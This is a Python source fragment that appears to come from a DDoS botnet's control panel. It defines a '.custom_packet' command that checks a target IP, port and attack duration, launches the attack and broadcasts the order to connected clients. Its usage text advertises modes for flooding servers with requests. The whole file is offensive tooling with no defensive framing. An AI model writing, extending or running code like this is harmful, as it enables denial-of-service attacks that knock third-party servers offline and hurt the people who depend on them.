from colorama import Fore

def custom_packet_attack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data):
    if len(args) == 7:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    send(client, ansi_clear, False)
                    attack_sent1(ip, port, secs, client)
                    broadcast(data)
                else:
                    send(client, Fore.RED + 'Invalid attack duration (1-999999999999 seconds)')
            else:
                send(client, Fore.RED + 'Invalid port number (1-65535)')
        else:
            send(client, Fore.RED + 'Invalid IP-address')
    else:
        send(client, 'Usage: .custom_packet [IP] [PORT] [TIME] [THREAD] [PAYLOAD] [MODE]')
        send(client, 'MODE1-2 USE FOR THREAD RUNNING . . .')
        send(client, 'DAEMON1 and THREAD (OLD RUNING)')
        send(client, 'REQUESTS1-2 (HIT SERVER WITH REQUESTS 1k++)')